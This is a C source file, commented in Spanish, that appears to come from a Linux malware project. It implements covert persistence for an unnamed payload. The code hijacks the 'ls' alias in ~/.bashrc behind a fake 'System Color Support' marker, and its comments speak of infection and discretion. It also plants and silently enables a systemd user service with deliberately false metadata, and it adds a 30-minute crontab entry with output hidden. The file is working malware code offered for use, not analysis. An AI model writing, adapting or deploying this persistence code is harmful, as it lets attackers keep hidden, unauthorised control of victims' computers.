#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include "persistence.h"
#include "config.h"

/* 
 * Pensamiento privado: 
 * Echando raíces en el sistema. Userland es suficiente si eres persistente.
 * Verificamos antes de escribir. La discreción es clave.
 */

int file_contains_str(const char *filepath, const char *str) {
    FILE *f = fopen(filepath, "r");
    if (!f) return 0;

    char line[1024];
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, str)) {
            fclose(f);
            return 1;
        }
    }
    fclose(f);
    return 0;
}

void deploy_persistence(const char *executable_path) {
    char *home = getenv("HOME");
    if (!home) return;

    // 1. Modificación de .bashrc
    char bashrc_path[512];
    snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", home);

    // Marcador único para saber si ya infectamos
    char marker[] = "# System Color Support";

    if (!file_contains_str(bashrc_path, marker) && !file_contains_str(bashrc_path, PROC_NAME)) {
        FILE *f = fopen(bashrc_path, "a");
        if (f) {
            // Alias ofuscado: comprueba si el proceso (PROC_NAME) corre, si no, lo lanza.
            // Usamos PROC_NAME de config.h
            fprintf(f, "\n%s\nalias ls='ls --color=auto && (ps -f | grep -v grep | grep \"%s\" > /dev/null || %s & disown)'\n",
                    marker, PROC_NAME, executable_path);
            fclose(f);
        }
    }

    // 2. Systemd user service
    // Solo intentamos si existe systemd user config o podemos crearla
    char systemd_dir[512];
    snprintf(systemd_dir, sizeof(systemd_dir), "%s/.config/systemd/user", home);

    // mkdir -p equivalente
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "mkdir -p %s", systemd_dir);
    if (system(cmd) != 0) { /* Ignore */ }

    char service_path[1024]; // Aumentado para evitar truncamiento
    snprintf(service_path, sizeof(service_path), "%s/%s.service", systemd_dir, INSTALL_NAME);

    if (access(service_path, F_OK) != 0) {
        FILE *f = fopen(service_path, "w");
        if (f) {
            fprintf(f, "[Unit]\nDescription=System User Service\nAfter=network.target\n\n"
                       "[Service]\nExecStart=%s\nRestart=always\nRestartSec=60\n"
                       "process_name=%s\n\n" // Metadata falsa
                       "[Install]\nWantedBy=default.target\n", executable_path, PROC_NAME);
            fclose(f);
            // Habilitar sin salida
            snprintf(cmd, sizeof(cmd), "systemctl --user enable %s.service >/dev/null 2>&1", INSTALL_NAME);
            if (system(cmd) != 0) { /* Ignore */ }
            snprintf(cmd, sizeof(cmd), "systemctl --user start %s.service >/dev/null 2>&1", INSTALL_NAME);
            if (system(cmd) != 0) { /* Ignore */ }
        }
    }

    // 3. Crontab
    // Comprobamos si ya está en crontab
    snprintf(cmd, sizeof(cmd), "crontab -l 2>/dev/null | grep \"%s\"", executable_path);
    if (system(cmd) != 0) {
        // No encontrado, añadir
        snprintf(cmd, sizeof(cmd), "(crontab -l 2>/dev/null; echo \"*/30 * * * * %s >/dev/null 2>&1\") | crontab -", executable_path);
        if (system(cmd) != 0) { /* Ignore */ }
    }
}
